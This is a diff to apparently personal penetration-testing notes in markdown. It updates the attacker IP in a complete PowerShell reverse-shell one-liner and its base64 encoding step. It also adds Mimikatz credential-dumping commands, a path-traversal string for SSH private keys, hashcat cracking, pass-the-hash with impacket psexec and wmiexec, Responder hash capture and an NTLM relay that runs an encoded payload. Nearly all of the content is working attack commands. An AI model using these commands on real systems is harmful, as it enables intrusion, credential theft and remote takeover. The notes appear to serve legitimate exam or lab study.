@@ -434,7 +434,7 @@ can sometimes fool extension checker by using capital letters -> script.PhP
 Powershell one liner for reverse shell
 
 ```
-New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+New-Object System.Net.Sockets.TCPClient("192.168.45.235",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
 Sequence for powershell reverse shell
@@ -446,7 +446,7 @@ Sequence for powershell reverse shell
 ```
 pwsh
 
-$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.235",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
@@ -1183,3 +1183,104 @@ hashcat --help | grep -i "KeePass"
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 
 ```
+
+
+ssh location for users 
+
+`../../../../../../../..//home/$user/.ssh/id_rsa`
+
+
+### Windows password hash
+
+use Mimikatz to transfer password hashes
+ we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege10 access right enabled.
+We can also elevate our privileges to the SYSTEM account with tools like PsExec11 or the built-in Mimikatz token elevation function12 to obtain the required privileges.
+
+check which users on windows system with `Get-LocalUser`
+
+mimikatz commands look like module::command
+
+`sekurlsa::logonpasswords` gets all plaaintext passwords and hashes (huge output)
+`lsadump::sam` gets all NLTM hashes
+
+need both debug access and token elevation to run the above commands
+
+```
+privilege::debug
+token::elevate
+
+lsadump::sam
+```
+NLTM hash with hashcat
+```
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+### Pass-the-hash
+
+some services allow username + password hash, but we have to use the right tools
+
+for SMB we can use smbclient
+
+```
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+>get secrets.txt
+```
+
+we can use impacket psexec.py and wmiexec.py for executiom
+
+psexec.py fo reverse shell
+format for the -hashes arg is LMHash:NTHash
+```
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+
+Due to the nature of psexec.py, we'll always receive a shell as SYSTEM instead of the user we used to authenticate.o
+
+use impacket-wmiexec to exec shell as user you auth'd with
+```
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+```
+
+### Net-NTLMv2
+need to use this when we don't have admin access
+key idea: ask target to auth with us thhen print the hash they used
+
+commands to get user privileges
+```
+whoami
+net user paul
+```
+
+before running Responder, need to list interfaces and attach it to one
+
+```
+ip a
+sudo responder -I tun0
+```
+
+then we need to request access on non-existent SMB share on our server
+
+```
+dir \\192.168.119.2\test
+```
+
+save the hash and fire up hashcat
+```
+hashcat --help | grep -i "ntlm"
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+** Note: can use burp to intercept file upload request then send to malicious SMB share
+\\192.168.45.235\test
+
+### Relaying NTLM
+
+use impacket-ntlmrelayx
+
+```
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
+```
+
+if UAC enabled we must run as Admin
